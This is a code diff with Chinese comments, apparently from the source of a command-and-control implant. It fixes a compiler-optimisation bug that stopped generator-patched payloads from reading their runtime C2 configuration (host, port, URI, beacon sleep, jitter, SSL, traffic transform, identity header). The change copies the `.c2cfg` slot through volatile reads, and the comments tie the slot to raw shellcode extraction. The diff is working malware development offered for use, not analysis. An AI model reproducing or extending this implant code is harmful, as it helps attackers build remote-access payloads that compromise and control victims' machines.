@@ -166,45 +166,87 @@ typedef struct {
  * 放在独立节 `.c2cfg` 里有两个好处:
  *   1) 生成器可以直接查节表定位, 不必只靠扫描;
  *   2) raw shellcode 那份是用 `objcopy --only-section=.text` 提取的, 默认会把
- *      .rdata 整个丢掉 —— 配置槽必须有自己可点名的节, 才能被一起提取出来。 */
+ *      .rdata 整个丢掉 —— 配置槽必须有自己可点名的节, 才能被一起提取出来。
+ *
+ * **必须带 volatile。** 原因见 c2cfg() 上方的长注释 —— 去掉它会静默失效。 */
 __attribute__((section(".c2cfg"), used))
-static const C2_RUNTIME_CFG g_c2cfg = {
+static const volatile C2_RUNTIME_CFG g_c2cfg = {
     { 0x52, 0x47, 0x43, 0x32, 0xA5, 0x5A, 0xC3, 0x3C },
     0u, 0u, 0u, 0u, 0u, 0u,
     "", "", "", "", "", "", "",
     { 0 }
 };
 
+/* ---------------------------------------------------------------------------
+ * 读取运行时配置槽。
+ *
+ * 这里踩过一个**极隐蔽**的坑, 必须记下来:
+ *
+ * 槽位原本声明成 `static const`, 访问器直接读它的字段。在 -O2 下编译器能看见
+ * 它的初始值 (version=0、host=""), 于是把 c2cfg_ok() 常量折叠成恒假, 再把每个
+ * 访问器折叠成对应的编译期默认值 —— **生成器写进文件里的配置一个字节都读不到**。
+ *
+ * 症状极难定位:
+ *   - 用 -DC2_HOST=<真实地址> 直接编译的载荷**能跑** (折叠后用的就是那个地址);
+ *   - 模板产出的载荷**永远连不上** (模板的编译期地址是占位值 0.0.0.0);
+ *   - 更坑的是"手工把槽位改成 version=1 再看"这种验证**也会通过**, 因为编译期
+ *     地址恰好是对的, 掩盖了槽位根本没被读取的事实。
+ *
+ * 所以改成: 首次使用时把整个槽位**逐字节经 volatile 读出**到一个普通副本,
+ * 之后一律读副本。副本的内容编译器无法预知, 因此不会被折叠; 而写入侧
+ * (生成器) 改的是同一个文件的同一段字节, 两边就此对齐。
+ *
+ * 移植或"优化"这段代码时**不要**把 volatile 去掉, 也不要改成直接读 g_c2cfg。 */
+static C2_RUNTIME_CFG g_cfgcopy;
+static int            g_cfgcopy_done;
+
+static const C2_RUNTIME_CFG *c2cfg(void)
+{
+    if (!g_cfgcopy_done) {
+        const volatile unsigned char *s = (const volatile unsigned char *)&g_c2cfg;
+        unsigned char *d = (unsigned char *)&g_cfgcopy;
+        unsigned int i;
+        for (i = 0; i < (unsigned int)sizeof(g_cfgcopy); i++) d[i] = s[i];
+        g_cfgcopy_done = 1;
+    }
+    return &g_cfgcopy;
+}
+
 /* 槽位是否已被生成器写入。
  * 只判 version + host —— **不要**在这里再写一份 magic 数组去比对:
  * 那会让 8 个标记字节在文件里出现两次, 破坏生成器"恰好命中一次"的校验。 */
 static int c2cfg_ok(void)
 {
-    return g_c2cfg.version == C2_CFG_VERSION && g_c2cfg.host[0] != '\0';
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return c->version == C2_CFG_VERSION && c->host[0] != '\0';
 }
 
 /* ---- 取值访问器 (运行时有值就用, 否则退回编译期默认) ---- */
 
 static const char *c2cfg_host(void)
 {
-    return c2cfg_ok() ? g_c2cfg.host : C2_HOST_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return c2cfg_ok() ? c->host : C2_HOST_DEF;
 }
 
 static unsigned short c2cfg_port(void)
 {
-    unsigned int p = c2cfg_ok() ? g_c2cfg.port : (unsigned int)C2_PORT_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    unsigned int p = c2cfg_ok() ? c->port : (unsigned int)C2_PORT_DEF;
     if (p == 0u || p > 65535u) p = (unsigned int)C2_PORT_DEF;
     return (unsigned short)p;
 }
 
 static const char *c2cfg_uri(void)
 {
-    return (c2cfg_ok() && g_c2cfg.uri[0]) ? g_c2cfg.uri : C2_URI_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return (c2cfg_ok() && c->uri[0]) ? c->uri : C2_URI_DEF;
 }
 
 static unsigned int c2cfg_sleep(void)
 {
-    unsigned int v = c2cfg_ok() ? g_c2cfg.sleep_ms : (unsigned int)C2_SLEEP_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    unsigned int v = c2cfg_ok() ? c->sleep_ms : (unsigned int)C2_SLEEP_DEF;
     if (v < 50u) v = 50u;                 /* 下界保护: 别把自己跑成忙等 */
     if (v > 3600000u) v = 3600000u;
     return v;
@@ -212,29 +254,34 @@ static unsigned int c2cfg_sleep(void)
 
 static unsigned int c2cfg_jitter(void)
 {
-    unsigned int v = c2cfg_ok() ? g_c2cfg.jitter : (unsigned int)C2_JITTER_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    unsigned int v = c2cfg_ok() ? c->jitter : (unsigned int)C2_JITTER_DEF;
     if (v > 90u) v = 90u;
     return v;
 }
 
 static int c2cfg_ssl(void)
 {
-    return c2cfg_ok() ? (int)(g_c2cfg.flags & 1u) : (C2_SSL_DEF ? 1 : 0);
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return c2cfg_ok() ? (int)(c->flags & 1u) : (C2_SSL_DEF ? 1 : 0);
 }
 
 static const char *c2cfg_xform(void)
 {
-    return (c2cfg_ok() && g_c2cfg.xform[0]) ? g_c2cfg.xform : C2_XFORM_DEF;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return (c2cfg_ok() && c->xform[0]) ? c->xform : C2_XFORM_DEF;
 }
 
 static const char *c2cfg_id_header(void)
 {
-    return (c2cfg_ok() && g_c2cfg.id_header[0]) ? g_c2cfg.id_header : C2_ID_HEADER;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return (c2cfg_ok() && c->id_header[0]) ? c->id_header : C2_ID_HEADER;
 }
 
 static const char *c2cfg_id_value(void)
 {
-    return (c2cfg_ok() && g_c2cfg.id_value[0]) ? g_c2cfg.id_value : C2_ID_VALUE;
+    const C2_RUNTIME_CFG *c = c2cfg();
+    return (c2cfg_ok() && c->id_value[0]) ? c->id_value : C2_ID_VALUE;
 }
 
 /* 供 token_gate.h 使用 (它在两个平台上共用, 所以只依赖这两个符号) */
